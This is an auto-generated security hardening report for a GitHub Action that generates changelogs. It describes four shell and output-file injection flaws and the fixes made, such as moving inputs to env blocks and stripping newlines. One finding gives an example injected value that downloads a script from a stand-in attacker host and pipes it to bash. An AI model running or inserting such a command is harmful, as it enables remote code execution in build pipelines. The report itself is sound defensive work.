<!-- markdownlint-disable -->

# Hardening Report: orhun--git-cliff-action/v4.9.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **orhun--git-cliff-action/v4.9.1** was hardened automatically. 4 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a) violation: The 'Run git-cliff' step in action.yml directly interpolates `${{ inputs.config }}` and `${{ inputs.args }}` inside the `run:` shell command string: `run: ${GITHUB_ACTION_PATH}/run.sh --config=${{ inputs.config }} ${{ inputs.args }}`. Both `inputs.config` and `inputs.args` are attacker-controlled values that are template-substituted by the Actions runner before the shell processes the string, enabling arbitrary command injection (e.g. an attacker could supply `args: "; curl attacker.com | bash"`). These values must be moved to an `env:` block and referenced as quoted shell variables instead.

Locations:

- `action.yml:40`

### github-env-injection (severity: high)

In run.sh, the variable `$OUTPUT` — which can be set from the `--output=` flag parsed out of `inputs.args` (an attacker-controlled input) — is written to `$GITHUB_OUTPUT` without the required sanitization step (`printf '%s' "$OUTPUT" | tr -d '\n\r'`). The unsanitized write `echo "changelog=$OUTPUT" >> $GITHUB_OUTPUT` allows a newline-containing value to inject additional key=value pairs into the GitHub output environment file. Similarly, `echo "version=$(jq -r '.[0].version' $CONTEXT)" >> $GITHUB_OUTPUT` writes jq output (derived from git history/tags) without sanitization.

Locations:

- `run.sh:68`
- `run.sh:71`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.config }}" appears directly in run: block of step "Run git-cliff"; move to env: map

Locations:

- `action.yml:45`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step "Run git-cliff"; move to env: map

Locations:

- `action.yml:45`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, static-inline-injection

**Notes:**

action.yml: Moved `${{ inputs.config }}` and `${{ inputs.args }}` from the `run:` shell string into an `env:` block as `INPUT_CONFIG` and `INPUT_ARGS`. Since `inputs.args` is a whitespace-separated argument list, it is tokenized with the xargs/read-loop idiom (quote-aware, bash arrays) before being passed to run.sh. `inputs.config` is a single path value passed as `--config=${INPUT_CONFIG}`. run.sh: Sanitized `$OUTPUT` and the `jq`-derived version string before writing to `$GITHUB_OUTPUT` using `printf '%s' "$VAR" | tr -d '\n\r'` to prevent newline injection.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed unquoted variable expansion in run.sh line 32: changed `mkdir -p "$(dirname $OUTPUT)"` to `mkdir -p "$(dirname "$OUTPUT")"`. The `$OUTPUT` variable is now properly double-quoted inside the command substitution, preventing word splitting and argument injection when the variable contains spaces or shell metacharacters sourced from the attacker-controllable `${{ inputs.args }}` input.

